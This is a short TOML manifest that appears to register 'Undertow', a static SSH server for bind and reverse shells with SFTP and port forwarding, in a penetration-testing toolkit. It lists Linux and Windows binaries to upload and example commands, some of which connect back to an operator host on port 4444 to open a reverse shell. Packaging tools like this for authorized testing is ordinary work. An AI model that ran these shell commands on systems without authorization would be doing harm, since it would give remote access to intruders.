schema = 1
kind = "both"
description = "Static SSH server for bind and reverse shells with PTY, SFTP and port forwarding"
tags = ["ssh", "shell", "pivot", "sftp", "tunnel", "linux", "windows"]
upstream = "https://github.com/Real-Fruit-Snacks/Undertow"
licence = "GPL-3.0"
arch = "x86_64"
examples = [
  "undertow -l -v -p 4444",
  "./undertow -d {lhost}:4444",
  "undertow.exe -d {lhost}:4444",
]

[[command]]
name = "undertow"
type = "binary"
path = "files/undertow"

[[upload]]
path = "files/undertow"
as = "undertow"
note = "Linux x86_64"

[[upload]]
path = "files/undertow.exe"
as = "undertow.exe"
note = "Windows x86_64"
